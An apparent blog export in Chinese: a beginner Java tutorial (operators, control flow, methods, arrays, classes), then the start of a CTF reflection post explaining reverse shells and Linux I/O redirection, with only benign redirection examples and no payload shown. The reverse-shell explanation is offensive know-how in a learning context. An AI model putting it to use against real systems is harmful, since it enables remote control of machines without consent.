<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTope</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.算数运算符</span></span><br><span class="line">        <span class="comment">//加号 1.表示正数2.相加 3.字符串拼接</span></span><br><span class="line">        System.out.println(+<span class="number">10</span>);</span><br><span class="line">        System.out.println(<span class="number">5</span>+<span class="number">6</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span><span class="number">10</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;输出一个数&quot;</span>+num);</span><br><span class="line">        System.out.println(<span class="string">&quot;abc&quot;</span>+<span class="number">5</span>+<span class="number">6</span>);</span><br><span class="line">        <span class="comment">//只要+左右两侧任意一侧是字符串，那么结果就是字符串</span></span><br><span class="line">        <span class="comment">//++自增</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span><span class="number">85</span>;</span><br><span class="line">        a++;</span><br><span class="line">        <span class="type">int</span> b=<span class="number">85</span>;</span><br><span class="line">        ++b;<span class="comment">//无论++放在变量前还是后都是+1</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        a=<span class="number">5</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> a++ + <span class="number">7</span>;<span class="comment">//如果++在变量的后面 先运算后加1，m=a+7 a+1</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(m);</span><br><span class="line">        a=<span class="number">5</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> ++a + <span class="number">7</span>;<span class="comment">//++在变量前，先加1，在运算，a=a+1,n=a+7</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(n);</span><br><span class="line">    &#125;<span class="comment">//程序入口</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">10</span></span><br><span class="line"><span class="comment">11</span></span><br><span class="line"><span class="comment">输出一个数10</span></span><br><span class="line"><span class="comment">abc56</span></span><br><span class="line"><span class="comment">86</span></span><br><span class="line"><span class="comment">86</span></span><br><span class="line"><span class="comment">6</span></span><br><span class="line"><span class="comment">12</span></span><br><span class="line"><span class="comment">6</span></span><br><span class="line"><span class="comment">13</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTOPe2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//赋值运算符 =</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span><span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num2</span> <span class="operator">=</span><span class="number">20</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num3</span> <span class="operator">=</span><span class="number">10</span>+<span class="number">30</span>;</span><br><span class="line">        <span class="comment">//求和</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">        sum+=num1;</span><br><span class="line">        sum+=num2;<span class="comment">//sum=sum+num2;</span></span><br><span class="line">        sum+=num3;<span class="comment">//sum=sum+num3;</span></span><br><span class="line">        System.out.println(<span class="string">&quot;和：&quot;</span>+sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#和：<span class="number">70</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTope3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//关系运算符==，最终结果是布尔值，不是true就是false</span></span><br><span class="line">        System.out.println(<span class="number">5</span>==<span class="number">6</span>);</span><br><span class="line">        System.out.println(<span class="number">5</span>==<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//逻辑运算符：逻辑运算符左右连接的是布尔值</span></span><br><span class="line">        System.out.println(<span class="literal">false</span>&amp;&amp;<span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="literal">true</span>&amp;&amp;<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//&amp;&amp;逻辑 都是ture 则为true 有一个false都为false</span></span><br><span class="line">        System.out.println(<span class="literal">false</span>&amp;&amp;<span class="literal">false</span>);</span><br><span class="line">        System.out.println(<span class="literal">true</span>&amp;&amp;<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//||逻辑 如果都为false 结果都为false</span></span><br><span class="line">        System.out.println(<span class="literal">false</span>||<span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="literal">true</span>||<span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="literal">false</span>||<span class="literal">false</span>);</span><br><span class="line">        System.out.println(<span class="literal">true</span>||<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">控制台结果：</span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">作用：流程控制语句是用来控制程序中各语句执行顺序的语</span><br><span class="line">句，可以把语句组合成能完成一定功能的小逻辑模块</span><br></pre></td></tr></table></figure>

<p>分类</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_28.png"></p>
<h2 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h2><p>if单分支</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_29.png" alt="img"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTif01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//需求 判断一个数是否大于0</span></span><br><span class="line">        <span class="comment">//给定一个数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span><span class="number">13</span>;</span><br><span class="line">        <span class="comment">//判定</span></span><br><span class="line">        <span class="keyword">if</span>(num &gt;<span class="number">10</span>)&#123;<span class="comment">//if 后面是一个表达式，true or false ,只有为true才会返回&#123;&#125;</span></span><br><span class="line">            System.out.println(<span class="string">&quot;这个数字大于10&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>if双分支</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_31.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTif02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//需求是否大于10</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span><span class="number">8</span>;</span><br><span class="line">        <span class="keyword">if</span>(num &gt;<span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这个数字大于10&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这个数小于等于10&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>if多分支</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_32.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTif03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//判断学生成绩的等级</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span><span class="number">84</span>;<span class="comment">//给定学生一个等级</span></span><br><span class="line"><span class="comment">//        if(score&gt;90)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(&quot;该学生的等级为A&quot;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        if(score&gt;80 &amp;&amp; score&lt;90)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(&quot;该学生的等级为B&quot;);</span></span><br><span class="line"><span class="comment">//        &#125;if(score&gt;70 &amp;&amp; score&lt;80)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(&quot;该学生的等级为C&quot;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="comment">//多分枝结构解决问题</span></span><br><span class="line">        <span class="keyword">if</span> (score &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;该学生的等级为A&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;该学生的等级为B&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">70</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;该学生的等级为C&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;该学生的等级为D&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//兜底</span></span><br><span class="line">            System.out.println(<span class="string">&quot;该学生的等级为E&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><p> while循环<img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_33.png" alt="img"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span><span class="number">1</span>;<span class="comment">//条件初始化</span></span><br><span class="line"><span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (num&lt;=<span class="number">5</span>) &#123;<span class="comment">//如果表达式结果为true，那么就变成死循环//判断</span></span><br><span class="line">            sum = sum + num;<span class="comment">//循环体</span></span><br><span class="line">            num++;<span class="comment">//迭代</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<p>num&lt;&#x3D;5-&gt;true,sum:1，num:2-&gt;第一次循环结束<br>num&lt;&#x3D;5-&gt;true,sum：3，num：3-&gt;第二次循环结束<br>num&lt;&#x3D;5-&gt;true,sum：6，num：4-&gt;第三次循环结束<br>num&lt;&#x3D;5-&gt;true,sum:10,num：5-&gt;第四次循环结束<br>num&lt;&#x3D;5-&gt;true,sum:15;num:6-&gt;第五次循环结束<br>m&lt;&#x3D;5-&gt;false-&gt;循环停止</p>
<p>for循环</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> num=<span class="number">1</span>;num&lt;=<span class="number">5</span>;num++) &#123;<span class="comment">//1.条件初始，条件判断，迭代</span></span><br><span class="line">    sum = sum + num;<span class="comment">//循环体</span></span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;和为&quot;</span>+sum</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="方法和方法重载"><a href="#方法和方法重载" class="headerlink" title="方法和方法重载"></a>方法和方法重载</h2><p>方法</p>
<p>就是一段用来完成特定功能的代码片段</p>
<p>例如psvm，sout</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方法声明格式</span><br><span class="line">修饰符1修饰符2]返回值类型方法名（形式对象名.方法名（实参列表）</span><br><span class="line">方法调用方式</span><br><span class="line">方法名（实参列表）（参数列表）</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTmethod</span> &#123;</span><br><span class="line">    <span class="comment">//提取一个方法， 将两个数求和</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">addNum</span><span class="params">(<span class="type">int</span> num1 ,<span class="type">int</span> num2)</span>&#123;</span><br><span class="line">            <span class="comment">//求和</span></span><br><span class="line"></span><br><span class="line">             <span class="type">int</span> sum=num1+num2;</span><br><span class="line">             <span class="keyword">return</span> sum;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//10，20</span></span><br><span class="line">         <span class="type">int</span> a=addNum(<span class="number">10</span>,<span class="number">20</span>);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        <span class="comment">//30，20</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> addNum(<span class="number">30</span>,<span class="number">20</span>);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        <span class="comment">//40，8186</span></span><br><span class="line">         addNum(<span class="number">40</span>,<span class="number">8186</span>);</span><br><span class="line">        System.out.println(addNum(<span class="number">40</span>,<span class="number">8186</span>));</span><br><span class="line">        <span class="comment">//1.方法 提高代码的复用性，写一次 直接调用即可</span></span><br><span class="line">    &#125;   <span class="comment">//public static  方法的修饰符</span></span><br><span class="line">        <span class="comment">// int 方法的返回值类型   方法返回值对应的数据类型</span></span><br><span class="line">    <span class="comment">// addNum 见名知意</span></span><br><span class="line">    <span class="comment">// num1 num2 形式参数列表 形参</span></span><br><span class="line">    <span class="comment">//10 20  实参</span></span><br><span class="line">    <span class="comment">//return sum; 方法的最后有方法的返回值（可有）如果没有返回值 方法申明出 加上void</span></span><br><span class="line">&#125;</span><br><span class="line">打印结果：</span><br><span class="line"><span class="number">30</span></span><br><span class="line"><span class="number">50</span></span><br><span class="line"><span class="number">8226</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方法的重载：</span><br><span class="line">在同一个类中，方法名相同，形参列表不同的多个方法，构成了方法的重载。</span><br></pre></td></tr></table></figure>

<p>方法名重复 但形参列表不一样&#x2F;&#x2F;方法 的重载只和形参列表有关</p>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>数组是相同类型数据的有序集合。其中，每一个数据称作一个元素，每个元素可以通过一个索引（下标）来访问它们。</p>
<p>特点</p>
<p>1.长度是确定的数组一旦被创建它的大小就是不可以改变的。<br>2.其元素的类型必须是相同类型，不允许出现混合类型<br>3.数组类型可以是任何数据类型，，包括基本类型和引用类型。<br>4.数组有索引的：索索引l从0开始，到数组.length-1结束</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTArray</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//数组声明</span></span><br><span class="line">        <span class="type">int</span>[] ary;<span class="comment">//定义一个数组</span></span><br><span class="line">        ary = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];<span class="comment">//给定一个数组的长度10</span></span><br><span class="line">        <span class="comment">//int ary =new int[10];一句话，默认长度的每个元素有默认的值</span></span><br><span class="line">        <span class="comment">//数组的赋值；</span></span><br><span class="line">        ary[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        ary[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">        ary[<span class="number">2</span>] = <span class="number">31</span>;</span><br><span class="line">        ary[<span class="number">3</span>] = <span class="number">365</span>;</span><br><span class="line">        ary[<span class="number">4</span>] = <span class="number">456</span>;</span><br><span class="line">        <span class="comment">//数组的使用</span></span><br><span class="line">        System.out.println(ary[<span class="number">3</span>]);</span><br><span class="line">        System.out.println(ary[<span class="number">1</span>]+<span class="number">30</span>);</span><br><span class="line">        <span class="comment">//数组的遍历（查看数组的每一个元素）</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span>;i &lt;=<span class="number">3</span>;i++)&#123;<span class="comment">//i代表元素的索引</span></span><br><span class="line">            System.out.println(<span class="string">&quot;第&quot;</span>+ i +<span class="string">&quot;个元素&quot;</span>+ary[i]);</span><br><span class="line">            System.out.println(<span class="string">&quot;增强的for循环&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> num:ary)&#123;</span><br><span class="line">    System.out.println(num);</span><br><span class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="面向对象-—类和对象"><a href="#面向对象-—类和对象" class="headerlink" title="面向对象 —类和对象"></a>面向对象 —类和对象</h2><p>类：对对象向上抽取出像的部分、公共的部分以此形成类，类就相当于一个模版。<br>对象：模版下具体的产物可以理解为具体对象，对象就是一个一个具体的实例，就<br>相当于这个模版下具体的产品。<br>Java中先定义类，再创建对象。</p>
<p>类的编写<br>1.给类起一个见名知意的名字，首字母大写，驼峰命名原则。<br>2.类的特性编写，特性即类的属性部分。<br>3.类的行为编写，行为即类的方法部分。<br>对象的创建和使用<br>创建格式：类名对象名&#x3D;new类名();<br>给对象的属性赋值：对象名.属性名&#x3D;值；<br>调用对象的方法：[返回值类型名字&#x3D;]对象名.方法名(参数列表);</p>
<p>对象的创建</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test05;</span><br><span class="line"><span class="comment">//人类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span> &#123;</span><br><span class="line">    <span class="comment">//特性编写 属性（指定义与业务逻辑相关的代码）</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">double</span> height;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//行为 方法</span></span><br><span class="line">    <span class="comment">//定义一个学习的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">study</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;伞兵一号卢本伟准备就绪&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">使用</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> test05;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//程序入口</span></span><br><span class="line">        <span class="comment">//对我们的person类进行创建</span></span><br><span class="line">        <span class="type">person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">person</span>();<span class="comment">//实例化一个对象</span></span><br><span class="line">        p1.name = <span class="string">&quot;Gu0f3n&quot;</span>;</span><br><span class="line">        p1.age = <span class="number">20</span>;</span><br><span class="line">        p1.height=<span class="number">181.99</span>;</span><br><span class="line">        System.out.println(p1.age);</span><br><span class="line">        System.out.println(p1.height);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h2><p>作用</p>
<p>对于一个类来说，一般有三种常见的成员：<strong>属性、方法、构造器。</strong><br>这三种成员都可以定义零个或多个。<br><strong>构造方法</strong>也叫构造器，是一个创建对象时被<strong>自动调用</strong>的特殊方法，用于对象的<strong>初始化。</strong><br>Java通过new关键字来调用构造器，从而返回该类的实例。</p>
<p>构造器声明类型</p>
<p>声明格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[修饰符]类名（形参列表）</span><br><span class="line">//n条语句</span><br></pre></td></tr></table></figure>

<p>若无参数列表，称之为无参构造器（空构造器）<br>若有参数列表，称之为有参构造器</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn2024的一些反思</title>
    <url>/2024/07/18/ciscn2024%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/</url>
    <content><![CDATA[<h3 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a><strong>什么是反弹shell</strong></h3><p>reverse shell，就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
<span id="more"></span><!-- more --><!-- more -->

<p>正向连接</p>
<p>就是我们客户端连服务器</p>
<p>我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接</p>
<p>反向连接</p>
<p>就是让服务器连我们</p>
<p>一般适用于</p>
<ul>
<li>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</li>
<li>目标机端口被占用。</li>
<li>目标机位于局域网，或IP会动态变化，攻击机无法直接连接。</li>
<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的</li>
<li>向web里面的话有可能出现在rce当中过滤的函数实在太多，我们只能去实现反向连shell</li>
</ul>
<h3 id="常见的方式"><a href="#常见的方式" class="headerlink" title="常见的方式"></a><strong>常见的方式</strong></h3><ul>
<li><p>Bash反弹shell</p>
</li>
<li><p>首先我们先了解下Linux的连接符号和重定向</p>
</li>
<li><p><strong>什么是重定向：</strong></p>
</li>
<li><p>Linux中的重定向就是<strong>将原本要输出到屏幕中的数据信息,重新指向某个特定文件当中</strong>，或者定向到黑洞文件（&#x2F;dev&#x2F;null）中。</p>
</li>
<li><p><strong>重定向的作用:</strong></p>
<ul>
<li><p>当屏幕输出的信息很重要,希望保存时</p>
</li>
<li><p>后台执行的程序一般都会有输出，不希望它输出干扰到终端</p>
</li>
<li><p>执行定时备份任务，希望将备份结果保留下来时</p>
</li>
<li><p>执行一些命令,会提示一些报错信息,可以直接将报错丢弃。</p>
</li>
<li><p>执行命令时希望将报错和正确内容区分在不同文件中时（日志）</p>
</li>
<li><ol>
<li><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a><strong>文件描述符</strong></h2></li>
</ol>
</li>
<li><blockquote>
<ol>
<li>文件描述符是IO重定向中的重要概念。文件描述符使用数字表示，它指明了数据的流向特征。</li>
</ol>
</blockquote>
</li>
</ul>
</li>
</ul>
<p>在Linux中我们分别使用描述符0，1，2表示</p>
<p>这三个默认的符号文件分别是终端字符设备的软连接&#x2F;dev&#x2F;stdin、&#x2F;dev&#x2F;stdout、&#x2F;dev&#x2F;srderr</p>
<p>表示标准输入、标准输出、和报错</p>
<p>当进程操作一个文件时：</p>
<p>首先程序是无法直接访问硬件，需要借助内核来访问文件</p>
<p>而内核kernel需要利用文件描述（file descriptor）来访问</p>
<p>总结：进程使用文件描述符来管理打开的文件对应关系</p>
<p><strong>通常程序访问一个文件至少会打开三个标准文件，分别是标准输入，<strong><strong>标准输出</strong></strong>，错误输出</strong></p>
<p><strong>进程将从标准输入中的到数据，将正常输出打印至屏幕终端，将错误的输出信息也打印至屏幕终端</strong></p>
<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a><strong>重定向</strong></h2><p>我们使用&gt;或者&gt;&gt;时符号<strong>左边</strong>表示文件描述符，没有的话默认<strong>是1</strong>（标准输出）符号右边可以是文件也可以是输出设备（linux中万物都是文件，且设备也是文件）<strong>当使用&gt;时，会判断右边的文件存不存在，如果存在的话就先删除，然后创建一个新的文件，不存在的话则直接创建。但是当使用&gt;&gt;进行追加时，则不会删除原来已经存在的文件</strong></p>
<p>简单用法就不举例子了</p>
<p>高级用法：</p>
<p>#将错误输出信息关闭掉，控制台只打印了标准输出</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt 2&gt;&amp;-</span><br></pre></td></tr></table></figure>

<p>this is a.txt</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>this is a.txt</p>
<p>#&amp;[n] 代表是已经存在的文件描述符，&amp;1 代表输出 &amp;2代表错误输出&amp;-代表关闭与它绑定的描述符</p>
<p>#&#x2F;dev&#x2F;null 这个设备，是linux 中黑洞设备，什么信息只要输出给这个设备，都会给吃掉</p>
<p>#关闭所有输出</p>
<p>#关闭 1 ，2 文件描述符</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt 1&gt;&amp;- 2&gt;&amp;-</span><br></pre></td></tr></table></figure>

<p>#将1,2 输出转发给&#x2F;dev&#x2F;null设备</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[chengmo@centos5 shell]$ ls test.sh test1.sh  2&gt;/dev/null 1&gt;/dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat 1.txt 2.txt &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>#将标准输出fd&#x3D;1重定向到&#x2F;dev&#x2F;null文件，然后将fd&#x3D;2重定向到fd&#x3D;1所绑定的&#x2F;dev&#x2F;null文件。这种常用文件描述符前必须有个 &amp;, 否则2&gt;1就变成将错误输出输出到一个名为1的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]<span class="built_in">cat</span> 1.txt 2.txt &amp;&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>#&amp;&gt;代表将标准输出与标准错误重定向到&#x2F;dev&#x2F;null文件</p>
<h3 id="输入重定向实例"><a href="#输入重定向实例" class="headerlink" title="输入重定向实例"></a><strong>输入重定向实例</strong></h3><p>我们使用<code>&lt;</code>对输入做重定向，<strong>如果符号左边没有写值，那么默认就是0。</strong> <strong>格式：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command-line [n] &lt;文件</span><br></pre></td></tr></table></figure>

<p>命令默认从键盘获得的输入，使用输入重定向改成从文件，或者其它打开文件以及设备输入。执行这个命令，将标准输入0，与文件或设备绑定，将由它进行输入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@sccprocddev02:/home/upro01]cat &gt; stdout.txt</span><br><span class="line"></span><br><span class="line">this is stdout.txt</span><br><span class="line"></span><br><span class="line">^C</span><br><span class="line"></span><br><span class="line">[root@sccprocddev02:/home/upro01]cat stdout.txt</span><br><span class="line"></span><br><span class="line">this is stdout.txt</span><br></pre></td></tr></table></figure>

<p>#这里使用ctrl+d 或者ctrl+c退出输入</p>
<p>#从标准输入[键盘]获得数据，然后输出给stdout.txt文件</p>
<p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]cat &gt; stdout2.txt &lt; stdout.txt</p>
<p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]cat stdout2.txt</p>
<p>this is stdout.txt</p>
<p>#从stdout.txt获得输入数据，然后输出给文件stdout2.txt</p>
<p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]cat &gt; stdout3.txt &lt;&lt; end</p>
<blockquote>
<p>first line</p>
<p>second line</p>
<p>end</p>
<p>[root@sccprocddev02:&#x2F;home&#x2F;upro01]#cat stdout3.txt</p>
<p>first line</p>
